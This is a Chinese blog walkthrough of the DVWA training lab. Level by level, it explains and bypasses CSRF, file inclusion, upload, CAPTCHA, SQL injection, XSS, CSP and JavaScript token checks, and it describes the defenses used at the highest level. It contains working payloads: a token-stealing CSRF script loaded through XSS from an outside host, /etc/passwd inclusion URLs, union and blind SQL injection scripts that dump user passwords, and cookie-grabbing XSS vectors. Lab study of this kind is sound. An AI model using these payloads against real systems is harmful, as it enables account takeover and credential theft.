123456789目录混淆法：将HTML页面放在127.0.0.1目录下，构建payloadhttp://www.mrl64.com/127.0.0.1/csrf.html文件名混淆法：将HTML文件重命名为127.0.0.1，构建payloadhttp://www.mrl64.com/127.0.0.1.html问号拼接法：由于HTML不接受参数，因此随便输入都可以绕过referer检测http://www.mrl64.com/csrf.html?mrl64…… high这关增加了token检测，我们必须要获取用户的token才能进行攻击。如果我们能成功将HTML保存到跨域白名单上，自然直接通过构建组合式CSRF表单再访问就可以了。但这个前提是很难做到的，因此需要通过JS发起请求并配合XSS进行。 新建一个JS： 123456789101112131415161718192021222324252627282930// 首先访问这个页面 来获取 tokenvar tokenUrl = &#x27;http://127.0.0.1/vulnerabilities/csrf/&#x27;; if(window.XMLHttpRequest) &#123; xmlhttp = new XMLHttpRequest();&#125;else&#123; xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);&#125; var count = 0;xmlhttp.withCredentials = true;xmlhttp.onreadystatechange=function()&#123; if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200) &#123; // 使用正则提取 token var text = xmlhttp.responseText; var regex = /user_token\\&#x27; value\\=\\&#x27;(.*?)\\&#x27; \\/\\&gt;/; var match = text.match(regex); var token = match[1]; // 发起 CSRF 请求 将 token 带入 var new_url = &#x27;http://127.0.0.1/vulnerabilities/csrf/?user_token=&#x27;+token+&#x27;&amp;password_new=111&amp;password_conf=111&amp;Change=Change&#x27;; if(count==0)&#123; count++; xmlhttp.open(&quot;GET&quot;,new_url,false); xmlhttp.send(); &#125; &#125;&#125;;xmlhttp.open(&quot;GET&quot;,tokenUrl,false);xmlhttp.send(); 写这个js要求还是挺高的，反正我现在写不出来，然后把这个js上传到服务器上，在DOM SXX的High中引入这个js： 1http://127.0.0.1/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;script src=&quot;http://www.xxxx.com/csrf.js&quot;&gt;&lt;/script&gt; 访问之后就改密成功了。 impossible增加了验证初始密码的选项，这在现实中是非常常见的保护机制，同样还可以使用验证码等其他方式进行保护，在这些情况下CSRF攻击是无法发起的。 File Inclusionlow经典文件包含题目，在low等级完全没有过滤的情况下，我们利用文件包含漏洞可以做许多的事： 读取文件：http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/passwd（linux限定） 远程文件包含：http://127.0.0.1/DVWA/vulnerabilities/fi/?page=www.baidu.com/robots.txt 本地/远程文件包含Getshell 伪协议使用：http://127.0.0.1/DVWA/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=index.php …… medium增加了对http://、https://、../、..\\的过滤，但是过滤的方法是使用str_replace()函数，而且没有区分大小写，因此双写过滤与大小写过滤均可使用。 例如： 1http://127.0.0.1/DVWA/vulnerabilities/fi/?page=hthttptps://www.mrl64.com/csrf.html high12345if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125; 这里要求匹配page参数的开头必须是file，否则执行exit结束程序，因此这里只能读取文件： 1http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file:///etc/passwd impossible无懈可击的白名单匹配，不愧是一生之敌。 12345678910111213&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt; File Uploadlow刷了upload-labs做这个就是洒洒水啦。首先low难度下对文件后缀没有进行任何过滤，因此直接上传muma1.php（&lt;?php phpinfo();?&gt;）文件就可以了，并且返回了路径地址，因此直接访问。 mediumupload-labs前两关的难度，上传jpg后改为php或者上传php并修改Content-Type都可以绕过检测： high12345678910// File information$uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1);$uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];$uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ];// Is it an image?if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; 这里就只能上传图片了，因此我们要用到图片码，配合伪协议读取就行了。 impossible1234567891011121314151617181920212223// Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &#x27;hackable/uploads/&#x27;; //$target_file = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;; $target_file = md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; $temp_file = ( ( ini_get( &#x27;upload_tmp_dir&#x27; ) == &#x27;&#x27; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#x27;upload_tmp_dir&#x27; ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;jpeg&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123; $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); &#125; else &#123; $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); &#125; imagedestroy( $img ); 文件名随机、无法截断，无懈可击。 Insecure CAPTCHA题目的意思是不安全的验证码，既然如此，就说明这题的验证码是可以被绕过的。如果在前端设计一个严密的、安全的验证码，将会阻止多种攻击方式的进行，但是如果像DVWA里这样不严密的话，绕过就是分分钟的事。 12345$resp = recaptcha_check_answer( $_DVWA[ &#x27;recaptcha_private_key&#x27;], $_POST[&#x27;g-recaptcha-response&#x27;] ); DVWA中的验证码认证代码 由于验证码是谷歌的，如果没有魔法上网页面会刷新很久而且不会显示出验证码，不过这不影响解题，因为这题中的验证码就是拿来绕过的。 low审计源码，发现后端将改密过程分为两个步骤，step1是验证验证码是否存在与正确，如果正确，则进入step2进行改密操作。不过由于没有任何验证参数，因此我们可以直接抓包更改step的值进行绕过：ps.由于没有魔法上网因此这里没有验证码的认证参数 之后通过就可以改密成功了。 medium12345if( !$_POST[ &#x27;passed_captcha&#x27; ] ) &#123; $html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; $hide_form = false; return;&#125; 我们发现这个难度下在step2中以POST请求的方式加入了passed_captcha这个参数来验证我们是否进行了step1，不过如果我们知道了这个参数的名字，那么这层防护也将毫无意义，因为只要在抓包页面中补充这个参数就可以了： high查看源码，发现这次将分步操作改成了单步操作，并且加了一点骚操作进去： 12345678910111213$resp = recaptcha_check_answer( $_DVWA[ &#x27;recaptcha_private_key&#x27; ], $_POST[&#x27;g-recaptcha-response&#x27;]);if ( $resp || ( $_POST[ &#x27;g-recaptcha-response&#x27; ] == &#x27;hidd3n_valu3&#x27; &amp;&amp; $_SERVER[ &#x27;HTTP_USER_AGENT&#x27; ] == &#x27;reCAPTCHA&#x27; ) ) 在程序中，只要验证码正确或者满足后面一个条件就可以进行改密操作。由于$resp是我们需要绕过的，因此我们的着手点就在后面那个条件。POST请求一个值为hidd3n_valu3的g-recaptcha-response，并且验证user_agent是否为reCAPTCH，那这也是直接抓包更改就好了： impossible移除了high难度中的可绕过参数判断，并且要求输入原密码，甚至针对CSRF使用了anti-CSRF token，这使得验证码的绕过几乎无解。 SQL Injection这些题都可以通过sqlmap跑出来（ low什么都没有过滤的sql注入，我们先测试发现注入方式为字符型GET注入，并且url最后会有一个&amp;Submit=Submit#，构建payload时不要忘了。但是当我们写入联合注入时，发生了报错： 经过搜索发现是因为编码混乱导致的错误，因此在构建payload时我们将想要获取的数据以16进制的方式返回即可，构建payload（列数为2）： 1http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&#x27; union select 1,hex(concat(table_name)) from information_schema.tables where table_schema=database()--+&amp;Submit=Submit# 查完表名就是一条龙服务了，这里就不演示了。 medium这次把注入方式换成了POST，但是还是没有做过滤，抓包更改POST就可以了，这次改成了数字型注入： high使用了session防止自动化攻击（实际上好像还是能用），但是在手工人面前这种没有过滤的注入毫无意义，直接抓包改包就可以了： impossible检测id是否为数字，并且进行预编译，防御拉满，毫无注入可能。 SQL Injection (Blind)这些题都可以通过sqlmap跑出来（ lowGET类型的sql盲注题，而且没有做任何的过滤，但是由于DVWA的登录机制，因此写脚本时要记得写入cookie，这里用了二分法编写布尔盲注的脚本： 1234567891011121314151617181920212223242526272829303132import requestsimport timeurl = &#x27;http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/&#x27;head = &#123;&#x27;Cookie&#x27;:&#x27;security=low;PHPSESSID=c2fad3pjoio31n2i15243jrb2n&#x27;&#125;s = requests.Session()flag = &#x27;&#x27;for i in range(1, 500): low = 32 high = 128 mid = (low + high) &gt;&gt; 1 while (low &lt; high): #查库 #payload = &#x27;?id=1\\&#x27; and (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid) #查表 #payload = &#x27;?id=1\\&#x27; and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid) #查列 #payload = &#x27;?id=1\\&#x27; and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=\\&#x27;dvwa\\&#x27; and table_name=\\&#x27;users\\&#x27;),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid) #查数据 payload = &#x27;?id=1\\&#x27; and (ascii(substr((select group_concat(user,password) from users),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid) time.sleep(0.05) if &quot;exists&quot; in s.get(url+payload, headers=head).text: low = mid + 1 else: high = mid mid = (low + high) &gt;&gt; 1 if (mid == 32 or mid == 127): break flag += chr(mid) print(flag)print(flag) 亲测，效果很好。 medium这个难度下请求方式改为了POST，注入方式改为了数字型注入，并且利用了mysql_real_escape_string()函数使单引号被过滤掉了。但由于仍然没有过滤其他关键字，因此payload构建方式和low难度下的差别不大： 12345678查库payload = &#x27;?id=1 and (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid)查表payload = &#x27;?id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid)查列payload = &#x27;?id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid)查数据payload = &#x27;?id=1 and (ascii(substr((select group_concat(user,password) from users),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid) 善用def写脚本，所有问题都不是问题。 high这个难度的提交页和结果页分离，最重要的是，服务器会随机执行sleep()函数，时间为2-4秒，因此这个难度下如果使用时间盲注的话效率较低，因此我们仍然选择布尔盲注。 当然仔细观察这个cookie，我们会发现id的值也写了进去，因此这题在写脚本时，要注意注入的是headers，payload与low中的一致，同样善用def解决一切。 impossible预编译、检测id、token检测，和上一关一样无懈可击（ Weak Session IDs关于Session的原理和功能之前的博客有进行过探讨，我们知道Session的核心功能是验证，如果对生成的Session没有无规律性与不可逆性，那么就极其容易被人伪造，造成严重后果。 low1234567891011121314vulnerabilities/weak_id/source/low.php&lt;?php$html = &quot;&quot;;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot;) &#123; if (!isset ($_SESSION[&#x27;last_session_id&#x27;])) &#123; $_SESSION[&#x27;last_session_id&#x27;] = 0; &#125; $_SESSION[&#x27;last_session_id&#x27;]++; $cookie_value = $_SESSION[&#x27;last_session_id&#x27;]; setcookie(&quot;dvwaSession&quot;, $cookie_value);&#125;?&gt; 每次访问都仅对上一次的Session加1处理，如果这样处理Session的话很容易导致黑客通过遍历Session进行攻击。 medium123456789&lt;?php$html = &quot;&quot;;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot;) &#123; $cookie_value = time(); setcookie(&quot;dvwaSession&quot;, $cookie_value);&#125;?&gt; 使用时间戳来生成Session，确实提高了一定的安全性，但时间戳同样是有规律的，现在有很多的工具可以直接破解时间戳，因此时间戳来生成Session依然是不安全的。 high1234567891011121314&lt;?php$html = &quot;&quot;;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot;) &#123; if (!isset ($_SESSION[&#x27;last_session_id_high&#x27;])) &#123; $_SESSION[&#x27;last_session_id_high&#x27;] = 0; &#125; $_SESSION[&#x27;last_session_id_high&#x27;]++; $cookie_value = md5($_SESSION[&#x27;last_session_id_high&#x27;]); setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#x27;HTTP_HOST&#x27;], false, false);&#125;?&gt; setcookie(name,value,expire,path,domain,secure,httponly) name 必需。规定cookie的名称。 value 必需。规定cookie的值。 expire 可选。规定cookie的有效期。 path 可选。规定cookie的服务器路径。 domain 可选。规定cookie的域名。 secure 可选。规定是否通过安全的HTTPS连接来传cookie。 httponly 可选。规定是否Cookie仅可通过HTTP协议访问。 不仅使用到了加1，同时还使用md5进行加密，这种加密有了一定的不可逆性，但是还是能被破解的，因为仍然存在规律。 impossible123456789&lt;?php$html = &quot;&quot;;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot;) &#123; $cookie_value = sha1(mt_rand() . time() . &quot;Impossible&quot;); setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#x27;HTTP_HOST&#x27;], true, true);&#125;?&gt; 随机数、时间戳、sha1加密一起上，真正做到了无规律性与不可逆性。 DOM Based Cross Site Scripting (XSS)12345678910111213141516171819202122&lt;div class=&quot;vulnerable_code_area&quot;&gt; &lt;p&gt;Please choose a language:&lt;/p&gt; &lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123; var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&#x27;&quot; + lang + &quot;&#x27;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;); &#125; document.write(&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt; &lt;/form&gt; &lt;/div&gt; 这就是这一关的html代码 low这个难度下前后端都没有进行任何的过滤。html中的lang变量通过document.location.href来获取到，并且在解码后直接输出到option中。因此我们构建payload： 1http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(document.cookie)&lt;/script&gt; medium添加了php后端过滤，查找&lt;script字符串在default变量值中第一次出现的位置（不区分大小写），如果匹配则手动将defalut改成English。 这里我们就不能直接写入JS脚本了，这个难度下我们可以通过闭合标签来解决这个问题： 1http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(document.cookie)&gt; img标签中的src图片加载失败，原来的图片位置会出现一个碎片图标.可以借用img标签的onerror事件，img标签支持onerror 事件，在装载文档或图像的过程中如果发生了错误，就会触发onerror事件。 这里同样可以使用其他类似的语句进行攻击，例如&lt;iframe onload=alert(document.cookie)&gt;等。 high这个难度下后端对defalut的值进行了白名单匹配： 1234567891011121314151617181920&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; # White list the allowable languages switch ($_GET[&#x27;default&#x27;]) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt; 但是这个白名单只检测了defalut的值，因此我们可以用&amp;连接另一个自定义变量或者用#借助注释进行绕过： 123http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English&amp;a=&lt;script&gt;alert(document.cookie)&lt;/script&gt;http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English #&lt;script&gt;alert(document.cookie)&lt;/script&gt; impossible我们在URL中注入的语句直接不解码了，那这不管怎样肯定都无法注入了。 Reflected Cross Site Scripting (XSS)1234567891011121314&lt;div class=&quot;body_padded&quot;&gt; &lt;h1&gt;Vulnerability: Reflected Cross Site Scripting (XSS)&lt;/h1&gt; &lt;div class=&quot;vulnerable_code_area&quot;&gt; &lt;form name=&quot;XSS&quot; action=&quot;#&quot; method=&quot;GET&quot;&gt; &lt;p&gt; What&#x27;s your name? &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/p&gt; &lt;/form&gt; &lt;pre&gt;Hello 1111&lt;/pre&gt; &lt;/div&gt; 这是本关的html代码 low后端并没有对输入进行过滤，仅仅检测了name的值是否存在。因此我们直接写入恶意JS脚本就可以了。 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; medium这关的后端对&lt;script&gt;进行了过滤，但是由于用的是str_replace函数且没有区分大小写，因此这里可以直接使用大小写以及双写绕过，同样对上一关medium难度下几个方法也同样适用： 12345&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/script&gt;&lt;img src=x onerror=alert(document.cookie)&gt;&lt;iframe onload=alert(document.cookie)&gt;…… high这次后端的对&lt;script&gt;过滤的过滤更加严格，大小写和双写都无法成功绕过。不过既然绕不过就没必要绕过了，不用到&lt;script&gt;就可以了： 123&lt;img src=x onerror=alert(document.cookie)&gt;&lt;iframe onload=alert(document.cookie)&gt;…… impossiblename变量通过htmlspecialchars()函数被HTML实体化后输出在了&lt;pre&gt;标签中,这个情况并没有什么绕过方法。 Stored Cross Site Scripting (XSS)由于是储存型XSS，所以要记得在注入后及时删除，不然会影响后面难度的注入。 1234567891011121314151617181920212223242526&lt;div class=&quot;body_padded&quot;&gt; &lt;h1&gt;Vulnerability: Stored Cross Site Scripting (XSS)&lt;/h1&gt; &lt;div class=&quot;vulnerable_code_area&quot;&gt; &lt;form method=&quot;post&quot; name=&quot;guestform&quot; &quot;&gt; &lt;table width=&quot;550&quot; border=&quot;0&quot; cellpadding=&quot;2&quot; cellspacing=&quot;1&quot;&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;Name *&lt;/td&gt; &lt;td&gt;&lt;input name=&quot;txtName&quot; type=&quot;text&quot; size=&quot;30&quot; maxlength=&quot;10&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;Message *&lt;/td&gt; &lt;td&gt;&lt;textarea name=&quot;mtxMessage&quot; cols=&quot;50&quot; rows=&quot;3&quot; maxlength=&quot;50&quot;&gt;&lt;/textarea&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;&amp;nbsp;&lt;/td&gt; &lt;td&gt; &lt;input name=&quot;btnSign&quot; type=&quot;submit&quot; value=&quot;Sign Guestbook&quot; onclick=&quot;return validateGuestbookForm(this.form);&quot; /&gt; &lt;input name=&quot;btnClear&quot; type=&quot;submit&quot; value=&quot;Clear Guestbook&quot; onClick=&quot;return confirmClearGuestbook();&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;/div&gt; 这是这关的html源码 low这个页面看起来就很像留言板了，后端也是没有什么过滤，因此我们可以在massage中写入恶意JS脚本： medium依然是不严格的str_replace()，而且这次的注入点在name中，嵌套、大小写、标签等方法就可以绕过，但是写入JS时发现字符长度被限制了，那就要通过bp抓包来进行注入了： high注入点依然是在name中，并且对&lt;script&gt;进行了严格过滤，依然有字符限制，那么依然是抓包进行注入，使用标签就可以了： impossible对name和massage都进行了过滤，并且设置了token进行验证，同时有效防止了XSS和CSRF。 Content Security Policy (CSP) BypassCSP简单理解就是白名单，是浏览器的安全策略。如果标签或服务器中返回的HTTP头中有Content-Security-Policy标签，浏览器就会根据其判断哪些网页资源可以被解析执行。CSP极大提升了网页的安全性，针对XSS起到了极大作用。关于这一关的具体原理等方面，可以参考下面这些博客：Content Security Policy 入门教程CSP策略与绕过 low查看后端php或者html头都可以发现允许包含的url为self、pastebin.com、hastebin.com、jquery和google analytics。我们依次访问（需要魔法上网）可以发现其中pastebin.com是一个文本分享的网站，我们可以通过在该网站写入一个恶意JS脚本，再通过靶场的包含将JS包含进去。 写入并创建恶意JS脚本，然后点击raw生成url： 最后回到DVWA将链接写入，点击include即可，不过由于这个网站服务器在美国，因此可能由于网络问题无法弹出弹窗。 medium查看后端代码，发现这样一行： 1$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;; 这里面没有可以类似于上一难度中可以直接包含的网页，但是有一个关键：nonce。 script-src是可以设置一些特殊值的： unsafe-inline：允许执行页面内嵌的&lt;script&gt;标签和事件监听函数 unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。 nonce：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个 token，才会执行 hash：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。ps.nonce值和hash值还可以用在style-src选项，控制页面内嵌的样式表 先举一个运用到hash的例子:服务器给出一个允许执行代码的hash值 1Content-Security-Policy: script-src &#x27;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&#x27; 这样下面这个代码就会被允许执行,因为hash值相同（不包括&lt;script&gt;标签） 1&lt;script&gt;alert(&#x27;Hello, world.&#x27;);&lt;/script&gt; 回到题目，这里使用了unsafe-inline和nonce，因此页面内嵌脚本，且必须有token才能执行，因此我们构建JS： 1&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(document.cookie)&lt;/script&gt; high后端php的CSP在这里只允许self，即本页加载的脚本运行。我们点击Slove the Sum按钮，发现html中多出来了一行： 1&lt;script src=&quot;source/jsonp.php?callback=solveSum&quot;&gt;&lt;/script&gt; 说明这里触发了JS，我们查看后端JS会发现有一个high.js文件，我们把这个文件和html中的部分代码结合起来： 123456789101112131415161718192021222324252627282930//high.jsfunction clickButton() &#123; var s = document.createElement(&quot;script&quot;); s.src = &quot;source/jsonp.php?callback=solveSum&quot;; document.body.appendChild(s);&#125;function solveSum(obj) &#123; if (&quot;answer&quot; in obj) &#123; document.getElementById(&quot;answer&quot;).innerHTML = obj[&#x27;answer&#x27;]; &#125;&#125;var solve_button = document.getElementById (&quot;solve&quot;);if (solve_button) &#123; solve_button.addEventListener(&quot;click&quot;, function() &#123; clickButton(); &#125;);&#125;//html&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;The page makes a call to ../..//vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt; &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;&lt;/form&gt; &lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt; 当按下按钮后，触发id=&quot;slove&quot;，即触发click事件使得clickButton()执行，使得一个新的&lt;script&gt;标签作为&lt;body&gt;中的子元素写入，内容是src = &quot;source/jsonp.php?callback=solveSum&quot;，因此我们会发现html中多出了一行： 这样浏览器就会发起请求： 1http://127.0.0.1/vulnerabilities/csp/source/jsonp.php?callback=solveSum 我们来访问一下这个url：浏览器收到请求过后收到answer值，这个值通过solveSum()返回到页面中，得到了15. 那么了解到整个原理之后，我们就可以开始思考注入方式了。我们知道当callback=solveSum时触发了这个函数，那么我们是不是可以自己写入一点东西进去，例如： 1?callback=alert(documemt.cookie) 我们发现这样JS就被写入了，但是我们应该如何注入呢，我们发现后端php中有这么一行： 123456&lt;?phpif (isset ($_POST[&#x27;include&#x27;])) &#123;$page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot;&quot;;&#125; POST提交的include参数会包含到&lt;body&gt;中，居然还有这种好事：成功。 impossible后端php限制了输出，这意味着只能回调JS中的solveSum()，相当于直接将JSONP限制死了，因此不存在注入可能。 JavaScript Attackslow直接输入success进去，发现提示我们token不匹配。我们使用burp suite抓包查看请求头文件： 我们发现根据这个头的内容猜测，后端逻辑应该是验证token和phrase是否匹配，且如果phrase的值为success，则返回过关提示，否则返回错误原因，那么我们怎么知道token与phrase之间的关系呢？再看看源码发现这样几行： 1234function generate_token() &#123; var phrase = document.getElementById(&quot;phrase&quot;).value; document.getElementById(&quot;token&quot;).value = md5(rot13(phrase)); &#125; phrase的值先进行rot13编码，再进行md5加密得到token值，那么我们就有办法获取到token了： 最后更改POST的内容： medium查看medium.js： 12345678910111213function do_something(e)&#123; for(var t=&quot;&quot;,n=e.length-1;n&gt;=0;n--) t+=e[n]; return t&#125;setTimeout(function()&#123;do_elsesomething(&quot;XX&quot;)&#125;,300);function do_elsesomething(e)&#123;document.getElementById(&quot;token&quot;).value=do_something(e+document.getElementById(&quot;phrase&quot;).value+&quot;XX&quot;)&#125; 不难看出这里将phrase倒序输出后在前两位与后两位补上了XX作为token，通过抓包我们也可以明显发现这个规律： 1token=XXeMegnahCXX&amp;phrase=ChangeMe&amp;send=Submit 那么这里的token就很简单了，我们构建payload： 1token=XXsseccusXX&amp;phrase=success&amp;send=Submit POST到网页中： 这里还有另一种方法，我们输入success，接着在控制台执行调用do_elsesomething(&quot;XX&quot;)，也可以成功注入： high查看high.js发现被混淆了，我们进行解码：Deobfuscate Javascript 12345678910111213141516171819function do_something(e) &#123; for (var t = &quot;&quot;, n = e.length - 1; n &gt;= 0; n--) t += e[n]; return t&#125;function token_part_3(t, y = &quot;ZZ&quot;) &#123; document.getElementById(&quot;token&quot;).value = sha256(document.getElementById(&quot;token&quot;).value + y)&#125;function token_part_2(e = &quot;YY&quot;) &#123; document.getElementById(&quot;token&quot;).value = sha256(e + document.getElementById(&quot;token&quot;).value)&#125;function token_part_1(a, b) &#123; document.getElementById(&quot;token&quot;).value = do_something(document.getElementById(&quot;phrase&quot;).value)&#125;document.getElementById(&quot;phrase&quot;).value = &quot;&quot;;setTimeout(function() &#123; token_part_2(&quot;XX&quot;)&#125;, 300);document.getElementById(&quot;send&quot;).addEventListener(&quot;click&quot;, token_part_3);token_part_1(&quot;ABCD&quot;, 44); 看的头都大了，结合wp我们来慢慢分析。 首先document.getElementById(&quot;phrase&quot;).value = &quot;&quot;将phrase的值置空，接着延迟300ms后执行token_part_2(&quot;XX&quot;)，接着当按下按钮后执行token_part_3，最后执行token_part_1。因此读懂运行逻辑后，我们就可以进行逻辑分析了。 首先执行token_part_1(&quot;ABCD&quot;, 44)函数，这个函数调用do_something(e)函数将phrase倒序并复制给token 接着延迟300秒后，执行token_part_2(&quot;XX&quot;)函数，生成（XX+phrase）的sha256值并复制给token 在点击按钮触发click事件后，执行token_part_3函数，生成（ZZ+上一步中的token）的sha256值复制给token，生成最后我们所看到的token。 分析结束了，那么我们发现问题出在phrase置空上，那么我们可以编辑success，提前调用token_part_1(&quot;ABCD&quot;, 44)和token_part_2(&quot;XX&quot;)，最后点击submit以绕过对phrase的置空： 总结这个靶场涉及的知识点还是很多的，从CSRF，到XSS，再到JS，反正理论是学了不少，不过理论还是得转化为实战能力，否则就是纸上谈兵了。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web 